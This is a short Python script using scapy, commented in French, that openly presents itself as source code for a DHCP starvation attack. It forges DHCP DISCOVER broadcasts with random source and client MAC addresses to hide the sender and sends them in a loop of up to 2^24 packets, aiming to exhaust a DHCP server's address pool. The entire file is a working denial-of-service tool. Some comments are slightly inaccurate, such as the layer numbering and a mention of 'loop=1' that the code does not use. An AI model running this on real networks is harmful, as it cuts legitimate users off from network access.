#!/usr/bin/python3
'''Code source pour l'attaque DHCP Starvation'''
#Importation de toutes les fonctionnalités de la bibliothèque scapy
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

#Construction d'un paquet DHCP_DISCOVER à envoyer
#Construction de la couche L1 Ethernet avec une adresse MAC de destination de multidiffusion et une adresse MAC source aléatoire avec la fonction "RandMAC" afin d'empêcher le serveur DHCP de déterminer l'expéditeur
frame_discover_l1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC(), type=0x0800)
#Construction de la couche L2 IP avec une adresse source par défaut et une adresse destination 255.255.255.255
frame_discover_l2 = IP(src="0.0.0.0", dst="255.255.255.255")
#Construction de la couche L3 UDP en spécifiant à quel port nous voulons que ce paquet soit envoyé, le port de destination est 67 et celui source est 68
frame_discover_l3 = UDP(dport=67,sport=68)
#Ajout de l'en-tête "BOOTP" afin de spécifier des options, "op=1" indique qu'il s'agit d'une demande de démarrage, de plus, l'adresse MAC du client se voit attribuer une adresse aléatoire
frame_discover_l4 = BOOTP(op=1, chaddr=RandMAC())
#Demande d'adresse IP au serveur DHCP en spécifiant qu'il s'agit d'un message de découverte
frame_discover_l5 = DHCP(options=[("message-type","discover"), ("end")])
#Encapsulation des différentes couches afin d'obtenir un paquet
frame_discover = frame_discover_l1 / frame_discover_l2 / frame_discover_l3 / frame_discover_l4 / frame_discover_l5
#Envoie du segment grâce à la fonction "sendp", le DHCP fonctionnant sur la couche L2 du modèle OSI
#Envoie du paquet à l'intérieur d'une boucle "loop=1" afin d'effectuer plusieurs interrogations demandant les adresses IP

for i in range (0, 2**24):
    sendp(frame_discover, iface="enxa0cec8f3e4df",loop=0,verbose=0 )
    time.sleep(0.4)
    print("Sending packet -"+ str(frame_discover_l2.fields["dst"]))
